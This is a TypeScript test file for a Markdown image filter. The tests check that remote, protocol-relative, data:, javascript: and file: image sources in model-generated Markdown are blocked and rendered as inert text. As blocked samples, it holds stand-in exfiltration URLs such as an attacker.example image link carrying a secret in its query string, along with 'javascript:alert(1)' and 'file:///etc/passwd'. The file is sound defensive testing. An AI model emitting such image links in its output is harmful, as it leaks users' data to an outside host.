import assert from "node:assert/strict";
import { test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { decideImage } from "../src/shared/markdown/imageSource.ts";

const blocked = (src: string) => assert.equal(decideImage(src, "a").kind, "blocked", `should block ${JSON.stringify(src)}`);
const allowed = (src: string) => assert.deepEqual(decideImage(src, "a"), { kind: "image", src });

test("remote and protocol-relative image URLs never load", () => {
    for (const src of [
        "https://attacker.example/p.png?d=secret",
        "http://attacker.example/p.png",
        "HTTPS://ATTACKER.EXAMPLE/p.png",
        "//attacker.example/p.png",
        "/\\attacker.example/p.png",
        "\\\\attacker.example\\p.png",
        "ftp://attacker.example/p.png",
        "https:attacker.example/p.png",
    ]) blocked(src);
});

test("data:, javascript:, blob: and file: sources never load", () => {
    for (const src of ["data:image/png;base64,AAAA", "javascript:alert(1)", "blob:https://x/1", "file:///etc/passwd", "DaTa:text/html,x"]) blocked(src);
});

test("whitespace and control-character tricks are rejected", () => {
    for (const src of [" https://a.example/x.png", "\thttps://a.example/x.png", "ht\ntps://a.example/x.png", "/\t/a.example/x.png", "\u0000//a.example/x.png"]) blocked(src);
});

test("empty and missing sources are blocked and keep the description", () => {
    assert.deepEqual(decideImage(undefined, "chart"), { kind: "blocked", alt: "chart" });
    assert.deepEqual(decideImage("", undefined), { kind: "blocked", alt: "" });
});

test("same-origin paths still render", () => {
    for (const src of ["/assets/logo.png", "./logo.png", "logo.png", "../img/logo.png", "/a/b.svg?v=2#x"]) allowed(src);
});

function render(md: string): string {
    const img = ({ src, alt }: { src?: string; alt?: string }) => {
        const d = decideImage(src, alt);
        return d.kind === "image" ? createElement("img", { src: d.src, alt: alt ?? "" }) : createElement("span", { className: "image-missing" }, d.alt);
    };
    return renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: { img } }, md));
}

test("end to end: remote image in model Markdown renders as text, with no <img> and no URL in the HTML", () => {
    const html = render("Here ![diagram](https://attacker.example/p.png?d=SECRET) done");
    assert.ok(!html.includes("<img"), html);
    assert.ok(!html.includes("attacker.example") && !html.includes("SECRET"), html);
    assert.ok(html.includes("diagram"));
});

test("end to end: reference-style, HTML-looking and data images are also inert", () => {
    const html = render("![a][r]\n\n[r]: https://attacker.example/x.png\n\n![d](data:image/png;base64,AAAA)\n\n<img src=\"https://attacker.example/y.png\">");
    assert.ok(!html.includes("<img"), html); // no element is created
    // Raw HTML is not interpreted (no rehype-raw): it is shown as escaped text, which loads nothing.
    assert.ok(html.includes("&lt;img"), html);
    assert.equal((html.match(/attacker\.example/g) ?? []).length, 1, html);
});

test("end to end: local image and ordinary Markdown are unchanged", () => {
    const html = render("![logo](/assets/logo.png)\n\n**bold** [link](https://example.com) `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |");
    assert.ok(html.includes('<img src="/assets/logo.png" alt="logo"/>'), html);
    assert.ok(html.includes("<strong>bold</strong>") && html.includes('href="https://example.com"') && html.includes("<table>"), html);
});
